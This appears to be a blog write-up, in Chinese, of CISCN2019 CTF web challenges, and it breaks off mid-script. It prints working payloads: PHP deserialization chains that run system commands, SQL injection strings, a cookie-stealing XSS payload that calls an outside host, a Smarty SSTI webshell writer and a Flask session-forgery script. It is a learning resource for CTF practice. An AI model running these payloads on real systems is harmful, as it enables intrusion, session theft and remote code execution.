@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="Laravel1一道cmv架构的php反序列化题，以前遇到这样的题，因为代码太多，不知道怎么看，无从下手233这里记录一下方法吧1、首先全局搜索__destruct这样的魔术方法2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类3、然后全局搜索能利用的可控函数附wpinclude包含文件的链子TagAwareAdapter::destruct()-&amp;gt;commit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2019">
+<meta property="og:url" content="http://yoursite.com/2020/02/08/CISCN2019-2/index.html">
+<meta property="og:site_name" content="cop&#39;s blog">
+<meta property="og:description" content="Laravel1一道cmv架构的php反序列化题，以前遇到这样的题，因为代码太多，不知道怎么看，无从下手233这里记录一下方法吧1、首先全局搜索__destruct这样的魔术方法2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类3、然后全局搜索能利用的可控函数附wpinclude包含文件的链子TagAwareAdapter::destruct()-&amp;gt;commit">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://uploader.shimo.im/f/C1R00Ir0N0Yl6rpT.png!thumbnail">
+<meta property="og:image" content="https://uploader.shimo.im/f/5VYuwiJu8f4TOCru.png!thumbnail">
+<meta property="og:updated_time" content="2020-02-11T12:28:57.798Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CISCN2019">
+<meta name="twitter:description" content="Laravel1一道cmv架构的php反序列化题，以前遇到这样的题，因为代码太多，不知道怎么看，无从下手233这里记录一下方法吧1、首先全局搜索__destruct这样的魔术方法2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类3、然后全局搜索能利用的可控函数附wpinclude包含文件的链子TagAwareAdapter::destruct()-&amp;gt;commit">
+<meta name="twitter:image" content="https://uploader.shimo.im/f/C1R00Ir0N0Yl6rpT.png!thumbnail">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/08/CISCN2019-2/">
+
+
+
+
+
+  <title>CISCN2019 | cop's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cop's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/08/CISCN2019-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="cop">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cop's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">CISCN2019</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-08T16:45:27+08:00">
+                2020-02-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="Laravel1"><a href="#Laravel1" class="headerlink" title="Laravel1"></a>Laravel1</h2><p>一道cmv架构的php反序列化题，以前遇到这样的题，因为代码太多，不知道怎么看，无从下手233<br>这里记录一下方法吧<br>1、首先全局搜索__destruct这样的魔术方法<br>2、看看本类中有没有可控的命令执行命令，如果没有就找有没有那个方法可以调用其他类<br>3、然后全局搜索能利用的可控函数<br>附<a href="https://xz.aliyun.com/t/5816" target="_blank" rel="noopener">wp</a><br>include包含文件的链子<br>TagAwareAdapter::destruct()-&gt;commit()-&gt;invalidateTags()-&gt;PhpArrayAdapter::saveDeferred()-&gt;PhpArrayTrait::initialize()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">class PhpArrayAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$file</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file=<span class="string">'/flag'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">final class CacheItem&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$deferred</span> = [];</span><br><span class="line">    private <span class="variable">$pool</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;pool=new PhpArrayAdapter();;</span><br><span class="line">        <span class="variable">$this</span>-&gt;deferred=[new CacheItem()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>= new TagAwareAdapter();</span><br><span class="line"><span class="built_in">echo</span>(urlencode(serialize(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure></p>
+<p>要注意一点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="keyword">function</span> saveDeferred(CacheItemInterface <span class="variable">$item</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这里saveDeferred()的参数是CacheItem对象，所以deferred必须是一个CacheItem对象</p>
+<p>还有用可变函数执行命令的链子<br>TagAwareAdapter::destruct()-&gt;commit()-&gt;invalidateTags()-&gt;ProxyAdapter::saveDeferred()-&gt;dosave()<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="variable">$this</span>-&gt;setInnerItem)(<span class="variable">$innerItem</span>, <span class="variable">$item</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$innerItem</span> = <span class="variable">$f</span>(<span class="variable">$this</span>-&gt;namespace.<span class="variable">$item</span>[<span class="string">"\0*\0key"</span>], null);//这里讲道理也可以用</span><br></pre></td></tr></table></figure></p>
+<p>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace Symfony\Component\Cache;</span><br><span class="line">class CacheItem </span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    protected <span class="variable">$innerItem</span> = <span class="string">'cat /flag'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace Symfony\Component\Cache\Adapter;</span><br><span class="line">use Symfony\Component\Cache\CacheItem;</span><br><span class="line">class ProxyAdapter</span><br><span class="line">&#123;</span><br><span class="line">	private <span class="variable">$setInnerItem</span> = <span class="string">'system'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class TagAwareAdapter</span><br><span class="line">&#123;</span><br><span class="line">    private <span class="variable">$deferred</span> = [];</span><br><span class="line">    private <span class="variable">$pool</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;pool=new ProxyAdapter();</span><br><span class="line">        <span class="variable">$this</span>-&gt;deferred=[new CacheItem()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new TagAwareAdapter();</span><br><span class="line"><span class="built_in">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure></p>
+<h2 id="CyberPunk"><a href="#CyberPunk" class="headerlink" title="CyberPunk"></a>CyberPunk</h2><p>在index.php f12发现提示<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=file?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>尝试伪协议读源码，审计源码发现user_name和iphone过滤很严格，感觉是不存在注入的<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">'/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i'</span>;</span><br></pre></td></tr></table></figure></p>
+<p>但是address只加了一个addslashes，在change.php<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">"update `user` set `address`='"</span>.<span class="variable">$address</span>.<span class="string">"', `old_address`='"</span>.<span class="variable">$row</span>[<span class="string">'address'</span>].<span class="string">"' where `user_id`="</span>.<span class="variable">$row</span>[<span class="string">'user_id'</span>];</span><br></pre></td></tr></table></figure></p>
+<p>这里又用到了从数据库中查询到的address，所以存在二次注入<br>因为输出了报错信息，所以用报错注入比较方便，payload:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#</span></span><br><span class="line"><span class="string">//user</span></span><br><span class="line"><span class="string">'</span> <span class="built_in">where</span> `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'user'</span>)),1)<span class="comment">#</span></span><br><span class="line">//Host,User,Password,Select_priv, 后面还有不读了</span><br><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select group_concat(Password) from user)),1)#</span></span><br></pre></td></tr></table></figure></p>
+<p>这里直接读Password，结果报错Password列不存在，试了下User也不存在，但是user_name可以读出来，可能是Password和User都是空的所以读不<br>出来，看了wp才知道flag在/flag.txt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">' where `user_id`=1 and updatexml(1,concat(0x3a,(select substr(load_file('</span>/flag.txt<span class="string">'),21,50))),1)#</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="CISCN2019-华东北赛区-Web2"><a href="#CISCN2019-华东北赛区-Web2" class="headerlink" title="[CISCN2019 华东北赛区]Web2"></a>[CISCN2019 华东北赛区]Web2</h2><p>因为对xss做的很少，直接去看了<a href="https://blog.csdn.net/weixin_44677409/article/details/100741998" target="_blank" rel="noopener">wp</a><br>用<a href="https://www.w3.org/MarkUp/html-spec/html-spec_13.html" target="_blank" rel="noopener">HTMLMarkup</a>转码,再用eval执行代码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xss =<span class="string">"(function()&#123;window.location.href='http://xss.buuoj.cn/index.php?do=api&amp;id=94Ah9Z&amp;location='+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;toplocation='+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;cookie='+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return ''&#125;&#125;)())+'&amp;opener='+escape((function()&#123;try&#123;return (window.opener &amp;&amp; window.opener.location.href)?window.opener.location.href:''&#125;catch(e)&#123;return ''&#125;&#125;)());&#125;)();"</span></span><br><span class="line">output = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> xss:</span><br><span class="line">    output += <span class="string">"&amp;#"</span> + str(ord(c))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"&lt;svg&gt;&lt;script&gt;eval&amp;#40&amp;#34"</span> + output + <span class="string">"&amp;#34&amp;#41&lt;/script&gt;"</span>)</span><br></pre></td></tr></table></figure></p>
+<p>跑md5脚本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">s1=<span class="string">"qwertyuiopasdfghjklzxcvbnm"</span></span><br><span class="line">s2=<span class="string">"0123456789"</span></span><br><span class="line">def func():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s2:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> s2:</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> s2:</span><br><span class="line">                <span class="keyword">for</span> l <span class="keyword">in</span> s2:</span><br><span class="line">                    <span class="keyword">for</span> m <span class="keyword">in</span> s2:</span><br><span class="line">                        <span class="keyword">for</span> n <span class="keyword">in</span> s2:</span><br><span class="line">                            <span class="keyword">for</span> i1 <span class="keyword">in</span> s2:</span><br><span class="line">                                <span class="string">""</span><span class="string">"for i2 in s2:</span></span><br><span class="line"><span class="string">                                    for i3 in s2:</span></span><br><span class="line"><span class="string">                                    for i4 in s2:</span></span><br><span class="line"><span class="string">                                    for i5 in s2:"</span><span class="string">""</span></span><br><span class="line">                                str=i+j+k+l+m+n+i1</span><br><span class="line">                                pw=hashlib.md5()</span><br><span class="line">                                pw.update(str.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">                                s=pw.hexdigest()</span><br><span class="line">                                <span class="keyword">if</span> s[0:6]==<span class="string">"2252ad"</span> :</span><br><span class="line">                                    <span class="built_in">return</span> str</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="built_in">print</span>(func())</span><br></pre></td></tr></table></figure></p>
+<p>注意在提交url的时候，域名要换成web，然后拿到cookie去访问admin.php<br>接下来是一个没有任何过滤的sql注入拿flag</p>
+<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>页面存在Current IP: 还有get XFF(X-Forwarded-For)，页面最后还有Build With Smarty !，在xff头测试:{2-1},存在ssti<br>直接拿之前的payload<br>Smarty模板<br>读文件payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(<span class="string">"file:///etc/passwd"</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p>写文件payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">"&lt;?php passthru(<span class="variable">$_GET</span>['cmd']); ?&gt;"</span>,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure></p>
+<p>$SCRIPT_NAME返回的是当前页面路径，所以上面的payload写的文件写在当前页面<br>结果报错，搜了下<a href="https://zhuanlan.zhihu.com/p/91595921" target="_blank" rel="noopener">wp</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;</span><br></pre></td></tr></table></figure></p>
+<p>返回当前smarty版本号，当前版本是3.1.30，旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经<br>把该静态方法删除<br>if标签<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Smarty的&#123;<span class="keyword">if</span>&#125;条件判断和PHP的<span class="keyword">if</span> 非常相似，只是增加了一些特性。每个&#123;<span class="keyword">if</span>&#125;必须有一个配对的&#123;/<span class="keyword">if</span>&#125;. 也可以使用&#123;<span class="keyword">else</span>&#125; 和 &#123;elseif&#125;. 全部的</span><br><span class="line">PHP条件表达式和函数都可以在<span class="keyword">if</span>内使用，如*||*, or, &amp;&amp;, and, is_array(), 等等</span><br></pre></td></tr></table></figure></p>
+<p>payload<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'cat /flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="CISCN2019-华东南赛区-Web4"><a href="#CISCN2019-华东南赛区-Web4" class="headerlink" title="[CISCN2019 华东南赛区]Web4"></a>[CISCN2019 华东南赛区]Web4</h2><p>?url=app.py 读源码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line">import re, random, uuid, urllib</span><br><span class="line">from flask import Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*233)</span><br><span class="line">app.debug = True</span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/'</span>)</span><br><span class="line">def index():</span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'www-data'</span></span><br><span class="line">    <span class="built_in">return</span> <span class="string">'Hello World! &lt;a href="/read?url=https://baidu.com"&gt;Read somethings&lt;/a&gt;'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/read'</span>)</span><br><span class="line">def <span class="built_in">read</span>():</span><br><span class="line">    try:</span><br><span class="line">        url = request.args.get(<span class="string">'url'</span>)</span><br><span class="line">        m = re.findall(<span class="string">'^file.*'</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">'flag'</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m or n:</span><br><span class="line">            <span class="built_in">return</span> <span class="string">'No Hack'</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="built_in">return</span> res.read()</span><br><span class="line">    except Exception as ex:</span><br><span class="line">        <span class="built_in">print</span> str(ex)</span><br><span class="line">    <span class="built_in">return</span> <span class="string">'no response'</span></span><br><span class="line"></span><br><span class="line">@app.route(<span class="string">'/flag'</span>)</span><br><span class="line">def flag():</span><br><span class="line">    <span class="keyword">if</span> session and session[<span class="string">'username'</span>] == <span class="string">'fuck'</span>:</span><br><span class="line">        <span class="built_in">return</span> open(<span class="string">'/flag.txt'</span>).<span class="built_in">read</span>()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">return</span> <span class="string">'Access denied'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    app.run(</span><br><span class="line">        debug=True,</span><br><span class="line">        host=<span class="string">"0.0.0.0"</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure></p>
+<p>伪造session，?url=/sys/class/net/eth0/address 读网卡地址<br>用exp算出SECRET_KEY<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">import flask_session_cookie_manager2</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:00:93:6e"</span></span><br><span class="line">random.seed(int(mac.replace(<span class="string">":"</span>, <span class="string">""</span>), 16))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(1000):</span><br><span class="line">    SECRET_KEY = str(random.random() * 233)</span><br><span class="line">    rs = flask_session_cookie_manager2.FSCM.decode(<span class="string">'eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.Xj_Orw.l8rfTkSo02Ynx-TjfTVXwm2I4lI'</span>, SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'error'</span> not <span class="keyword">in</span> rs:</span><br><span class="line">        <span class="built_in">print</span>(SECRET_KEY)</span><br><span class="line">        rs[u<span class="string">'username'</span>] = <span class="string">'fuck'</span></span><br><span class="line">        <span class="built_in">print</span>(str(rs))</span><br><span class="line">        <span class="built_in">print</span>(flask_session_cookie_manager2.FSCM.encode(SECRET_KEY, str(rs)))</span><br><span class="line">        <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://uploader.shimo.im/f/C1R00Ir0N0Yl6rpT.png!thumbnail" alt><br>再用flask_session_cookie_manager2.py重新签名去访问/flag</p>
+<h2 id="CISCN2019-华东南赛区-Double-Secret"><a href="#CISCN2019-华东南赛区-Double-Secret" class="headerlink" title="[CISCN2019 华东南赛区]Double Secret"></a>[CISCN2019 华东南赛区]Double Secret</h2><p>提示 Welcome To Find Secret 访问/secret<br>然后提示 Tell me your secret.I will encrypt it so others can’t see<br>?secret=1 返回了一个字符，随便试了下超过4位数会报错<br>然后可以看到部分代码，是rc4加密，密钥是HereIsTreasure，然后render_template_string将加密后的内容返回<br>rc4加密后的密文再加密结果是明文，这样构造payload先加密一次，再加密的时候就返回了payload<br>exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">class RC4:</span><br><span class="line">    def __init__(self, key):</span><br><span class="line">        self.key = key</span><br><span class="line">        self.key_length = len(key)</span><br><span class="line">        self._init_S_box()</span><br><span class="line"> </span><br><span class="line">    def _init_S_box(self):</span><br><span class="line">        self.Box = [i <span class="keyword">for</span> i <span class="keyword">in</span> range(256)]</span><br><span class="line">        k = [self.key[i % self.key_length] <span class="keyword">for</span> i <span class="keyword">in</span> range(256)]</span><br><span class="line">        j = 0</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(256):</span><br><span class="line">            j = (j + self.Box[i] + ord(k[i])) % 256</span><br><span class="line">            self.Box[i], 